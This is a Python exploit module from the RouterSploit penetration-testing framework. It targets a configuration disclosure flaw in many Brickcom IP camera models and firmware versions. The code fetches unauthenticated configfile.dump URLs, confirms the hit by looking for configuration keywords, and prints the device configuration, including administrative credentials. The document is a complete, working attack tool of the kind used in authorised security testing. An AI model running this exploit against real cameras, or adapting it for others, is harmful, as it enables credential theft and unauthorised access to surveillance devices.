from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Brickcom Corp Network Camera Conf Disclosure",
        "description": "Module exploits Brickcom Corporation Network Camera Configuration Dislosure vulnerability. If target is vulnerable "
                       "it is possible to read device configuration including administrative credentials.",
        "authors": (
            "Orwelllabs",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/39696/",
        ),
        "devices": (
            "Brickcom FB-100Ae IP Box Camera - Firmware Version: v3.0.6.12 (release:09/08/2010 14:46)",
            "Brickcom WCB-100Ap Wireless Camera - Firmware Version: v3.0.6.26 (release:01/21/2011 18:31)",
            "Brickcom VD-202Ne Vandal Dome Camera - Firmware Version: v37019_Promise (release:2015-10-01_18:46:07)",
            "Brickcom VD-300Np Vandal Dome Camera - Firmware Version: v3.7.0.23T (release:2016-03-21_10:08:24)",
            "Brickcom VD-E200Nf Vandal Dome Camera - Firmware Version: v3.7.0.5T (release:2015-06-25_11:18:07)",
            "Brickcom OB-202Ne Bullet Camera - Firmware Version: v3.7.0.18R (release:2015-09-08_18:40:11)",
            "Brickcom OB-E200Nf Bullet Camera - Firmware Version: v3.7.0.18.3R (release:2015-10-16_11:36:46)",
            "Brickcom OB-200Np-LR Bullet Camera - Firmware Version: v3.7.0.18.3R (release:2015-10-15_11:30:46)",
            "Brickcom OB-500Ap Bullet Camera - Firmware Version: v3.7.0.1cR (release:2016-01-18_10:07:03)",
            "Brickcom GOB-300Np Bullet Camera (Unique Series) - Firmware Version: v3.7.0.17A (release: 2015-07-10_11:36:41)",
            "Brickcom OB-200Np-LR Bullet Camera (Unique Series) - Firmware Version: v3.7.0.18.3R (release: 2015-10-15_11:30:46)",
            "Brickcom MD-300Np Mini Dome Camera - Firmware Version: v3.2.2.8 (release:2013-08-01)",
            "Brickcom CB-102Ae V2 Cube Camera - Firmware Version: v3.0.6.12 (release: 09/07/2010 11:45)",
            "Brickcom FD-202Ne Fixed Dome Camera - Firmware Version:v3.7.0.17R (release: 2015-08-19_18:47:31)",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def __init__(self):
        self.paths = (
            "/configfile.dump?action=get",
            "/configfile.dump.backup",
            "/configfile.dump.gz",
            "/configfile.dump",
        )

        self.content = None
        self.valid_path = None

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            print_status("Dumping configuration...")
            print_status("URL: {}".format(self.get_target_url(path=self.valid_path)))

            dump_size = 10000
            if len(self.content) > dump_size:
                print_status("Content too big to display - showing first {} characters.".format(dump_size))
                print_info(self.content[:dump_size])  # max 10000 characters
                print_info("(..)")
            else:
                print_info(self.content)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        for path in self.paths:
            response = self.http_request(
                method="GET",
                path=path,
            )

            if response is None:
                break

            if any([setting in response.text for setting in ["DeviceBasicInfo", "UserSetSetting", "DDNSSetting"]]):
                self.content = response.text
                self.valid_path = path
                return True  # target is vulnerable

        return False  # target is not vulnerable
